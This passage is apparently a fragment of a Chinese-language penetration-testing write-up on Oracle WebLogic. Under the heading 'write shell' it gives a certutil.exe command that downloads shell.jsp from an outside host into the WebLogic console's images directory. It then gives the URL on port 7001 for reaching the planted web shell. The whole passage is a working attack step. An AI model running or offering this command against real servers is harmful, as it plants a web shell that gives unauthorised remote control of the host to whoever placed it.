### 写入shell

*   • 通过`certutil.exe`下载shell至`C:\Oracle\Middleware\Oracle_Home\wlserver\server\lib\consoleapp\webapp\images`目录
    

```
certutil.exe -urlcache -split -f http://XX.XX.XX.XX/shell.jsp >C:\Oracle\Middleware\Oracle_Home\wlserver\server\lib\consoleapp\webapp\images\shell.jsp
```

连接shell的地址，shell写入到console下的images目录`http://192.168.50.172:7001/console/images/shell.jsp`
